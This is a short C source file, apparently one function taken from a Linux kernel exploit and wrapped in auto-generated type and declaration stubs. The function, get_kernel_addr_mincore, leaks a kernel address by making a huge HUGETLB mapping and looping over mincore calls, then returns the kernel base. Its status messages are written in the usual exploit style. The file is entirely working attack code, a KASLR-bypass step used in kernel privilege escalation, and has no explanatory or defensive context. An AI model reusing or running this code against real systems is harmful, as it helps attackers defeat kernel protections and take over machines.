#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int MAP_ANONYMOUS ; 
 scalar_t__ MAP_FAILED ; 
 int MAP_HUGETLB ; 
 int MAP_NORESERVE ; 
 int MAP_SHARED ; 
 int /*<<< orphan*/  PROT_NONE ; 
 int /*<<< orphan*/  dprintf (char*) ; 
 int getpagesize () ; 
 scalar_t__ mincore (void*,int,unsigned char*) ; 
 scalar_t__ mmap (void*,int,int /*<<< orphan*/ ,int,int,int /*<<< orphan*/ ) ; 
 scalar_t__ munmap (void*,int) ; 

unsigned long get_kernel_addr_mincore() {
	unsigned char buf[getpagesize()/sizeof(unsigned char)];
	unsigned long iterations = 20000000;
	unsigned long addr = 0;

	dprintf("[.] trying mincore info leak...\n");
	/* A MAP_ANONYMOUS | MAP_HUGETLB mapping */
	if (mmap((void*)0x66000000, 0x20000000000, PROT_NONE,
		MAP_SHARED | MAP_ANONYMOUS | MAP_HUGETLB | MAP_NORESERVE, -1, 0) == MAP_FAILED) {
		dprintf("[-] mmap()\n");
		return 0;
	}

	int i;
	for (i = 0; i <= iterations; i++) {
		/* Touch a mishandle with this type mapping */
		if (mincore((void*)0x86000000, 0x1000000, buf)) {
			dprintf("[-] mincore()\n");
			return 0;
		}

		int n;
		for (n = 0; n < getpagesize()/sizeof(unsigned char); n++) {
			addr = *(unsigned long*)(&buf[n]);
			/* Kernel address space */
			if (addr > 0xffffffff00000000) {
				addr &= 0xffffffffff000000ul;
				if (munmap((void*)0x66000000, 0x20000000000))
					dprintf("[-] munmap()\n");
				return addr;
			}
		}
	}

	if (munmap((void*)0x66000000, 0x20000000000))
		dprintf("[-] munmap()\n");

	dprintf("[-] kernel base not found in mincore info leak\n");
	return 0;
}